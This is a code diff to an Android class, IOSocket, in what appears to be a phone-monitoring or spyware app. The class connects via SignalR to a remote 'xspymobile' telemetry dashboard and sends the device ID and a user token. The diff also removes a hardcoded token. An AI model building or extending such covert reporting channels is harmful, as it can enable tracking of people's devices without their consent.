@@ -1,5 +1,6 @@
 package com.remote.app.socket;
 
+import android.content.SharedPreferences;
 import android.provider.Settings;
 
 import com.microsoft.signalr.HubConnection;
@@ -15,34 +16,32 @@ public class IOSocket {
     private HubConnection ioSocket;
 
 
-    private IOSocket() {
-        try {
-            String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
+    public HubConnection init(String key) {
+        if (key == null || ioSocket != null)
+            return ioSocket;
 
-            Map<String, String> headers = new HashMap<String, String>();
-            headers.put("device-id", deviceID);
-            headers.put("user-token", "ba53922b-64ee-424c-bdc5-19c9ee82c1af");
+        String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
 
-            ioSocket = HubConnectionBuilder.create("http://192.168.0.4:5000/telemetry")
-                    .withHeaders(headers)
-                    .build();
+        Map<String, String> headers = new HashMap<String, String>();
+        headers.put("device-id", deviceID);
+        headers.put("user-token", key);
 
-            //ioSocket = IO.socket("http://192.168.0.6:80?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+        ioSocket = HubConnectionBuilder.create("https://dash.xspymobile.com/telemetry")
+                .withHeaders(headers)
+                .build();
+
+        return ioSocket;
     }
-
 
     public static IOSocket getInstance() {
         return ourInstance;
     }
 
-    public HubConnection getIoSocket() {
-        return ioSocket;
-    }
 
     public void send(String method, Object... args) {
+        if (ioSocket == null)
+            return;
+
         if (ioSocket.getConnectionState() == HubConnectionState.CONNECTED)
             ioSocket.send(method, args);
     }
